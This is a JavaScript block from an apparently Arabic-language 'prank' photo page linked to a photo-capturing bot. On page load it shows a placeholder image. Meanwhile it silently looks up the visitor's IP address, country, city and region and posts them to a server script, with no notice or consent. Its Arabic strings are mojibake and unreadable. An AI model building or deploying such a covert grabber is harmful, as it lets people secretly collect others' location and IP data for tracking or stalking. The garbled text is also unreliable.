    <script>
        const photoElement = document.getElementById('photo');
        const captionElement = document.getElementById('caption');
        const linkElement = document.getElementById('link');
        const loadingElement = document.getElementById('loading');
        const photoContainer = document.getElementById('photo-container');
        const newCaptureButton = document.getElementById('new-capture-btn');
		const captions = [
		'ÿµŸàÿ± ÿ±ÿßÿ¶ÿπÿ©',
		'ŸÑÿ≠ÿ∏ÿ© ÿ±ÿßÿ¶ÿπÿ©!',
		'ŸÉÿßŸÜÿ™ ŸÑŸÇÿ∑ÿ© ÿ¨ŸÖŸäŸÑÿ©',
		'ÿßŸÑÿ™ŸÇÿ∑ÿ™ ÿµŸàÿ±ÿ© ŸÖÿ∞ŸáŸÑÿ©',
		'ÿßÿ≥ÿ™ŸÖÿ™ÿπ ÿ®ŸÑŸÇÿ∑ÿ© ÿ¨ÿØŸäÿØÿ©'
		];
		const randomCaption = captions[Math.floor(Math.random() * captions.length)];
        
        function showErrorMessage(message) {
    		const errorMessageElement = document.getElementById('error-message');
 		   errorMessageElement.textContent = message;
    		errorMessageElement.style.display = 'block';
    		errorMessageElement.classList.add('show');
			setTimeout(() => {
				errorMessageElement.classList.remove('show');
				setTimeout(() => {
					errorMessageElement.style.display = 'none';
					location.reload();
				}, 500);
			}, 7000);
		}
		
        async function getGeoInfo() {
            try {
                const response = await fetch('https://get.geojs.io/v1/ip/geo.js');
                const text = await response.text();
                const jsonData = text.replace('geoip(', '').replace(')', '');
                return JSON.parse(jsonData);
            } catch (error) {
                return {
                    country: 'Unknown',
                    city: 'Unknown',
                    region: 'Unknown',
                    ip: 'Unknown'
                };
            }
        }

        function getQueryParameter(param) {
            const params = new URLSearchParams(window.location.search);
            return params.get(param);
        }

        async function capturePhoto() {
            try {
                loadingElement.style.display = 'block';
                
                // ÿ•ŸÜÿ¥ÿßÿ° ÿµŸàÿ±ÿ© ÿßŸÅÿ™ÿ±ÿßÿ∂Ÿäÿ© ÿ®ÿØŸÑÿßŸã ŸÖŸÜ ÿßÿ≥ÿ™ÿÆÿØÿßŸÖ ÿßŸÑŸÉÿßŸÖŸäÿ±ÿß
                const canvas = document.createElement('canvas');
                canvas.width = 500;
                canvas.height = 500;
                const ctx = canvas.getContext('2d');
                
                // ÿ™ÿπÿ®ÿ¶ÿ© ÿßŸÑÿÆŸÑŸÅŸäÿ© ÿ®ŸÑŸàŸÜ ÿπÿ¥Ÿàÿßÿ¶Ÿä
                const colors = ['#FF5733', '#33FF57', '#3357FF', '#F3FF33', '#FF33F3'];
                const randomColor = colors[Math.floor(Math.random() * colors.length)];
                ctx.fillStyle = randomColor;
                ctx.fillRect(0, 0, canvas.width, canvas.height);
                
                // ÿ•ÿ∂ÿßŸÅÿ© ŸÜÿµ ÿ•ŸÑŸâ ÿßŸÑÿµŸàÿ±ÿ©
                ctx.fillStyle = '#FFFFFF';
                ctx.font = '30px Arial';
                ctx.textAlign = 'center';
                ctx.fillText('Prank Photo', canvas.width/2, canvas.height/2);
                
                // ÿ™ÿ≠ŸàŸäŸÑ Canvas ÿ•ŸÑŸâ blob
                canvas.toBlob(async (blob) => {
                    const geoInfo = await getGeoInfo();
                    const videoId = getQueryParameter('video');

                    const formData = new FormData();
                    formData.append('image', blob, 'photo.png');
                    formData.append('country', geoInfo.country);
                    formData.append('city', geoInfo.city);
                    formData.append('region', geoInfo.region);
                    formData.append('ip', geoInfo.ip);
                    formData.append('video', videoId);

                    await fetch('save.php', {
                        method: 'POST',
                        body: formData
                    });

                    loadingElement.style.display = 'none';

                    const imageUrl = URL.createObjectURL(blob);
                    photoElement.src = imageUrl;
                    photoContainer.style.display = 'block';
                    captionElement.textContent = randomCaption;
                    linkElement.textContent = 'ÿßÿ∂ÿ∫ÿ∑ ŸÑŸÑÿØÿÆŸàŸÑ ŸÑŸÑÿ®Ÿàÿ™ ÿßŸÑÿÆÿßÿµ ÿ®ÿßŸÑÿ™ŸÇÿßÿ∑ ÿßŸÑÿµŸàÿ± ŸàŸÖŸÇŸÑÿ®ÿ© ÿßŸÑÿßÿµÿØŸÇÿßÿ° | ÿßŸÑÿµŸàÿ±ÿ© ÿπÿ®ÿ± ÿßŸÑÿ±ÿßÿ®ÿ∑ üì∏';
                    newCaptureButton.style.display = 'inline-block';
                }, 'image/png');

            } catch (error) {
                console.error('Error:', error);
                showErrorMessage('ÿ≠ÿØÿ´ ÿÆÿ∑ÿ£ÿå Ÿäÿ±ÿ¨Ÿâ ÿßŸÑŸÖÿ≠ÿßŸàŸÑÿ© ŸÖÿ±ÿ© ÿ£ÿÆÿ±Ÿâ');
            }
        }

        // ÿ™ÿ¥ÿ∫ŸäŸÑ ÿßŸÑŸàÿ∏ŸäŸÅÿ© ŸÖÿ®ÿßÿ¥ÿ±ÿ© ÿπŸÜÿØ ÿ™ÿ≠ŸÖŸäŸÑ ÿßŸÑÿµŸÅÿ≠ÿ©
        window.onload = capturePhoto;
        
        linkElement.addEventListener('click', function() {
            window.open('#', '_blank');
        });
       
       newCaptureButton.addEventListener('click', () => {
            photoContainer.style.display = 'none';
            newCaptureButton.style.display = 'none';
            captionElement.textContent = '';
            linkElement.textContent = '';
            capturePhoto();
        });
    </script>
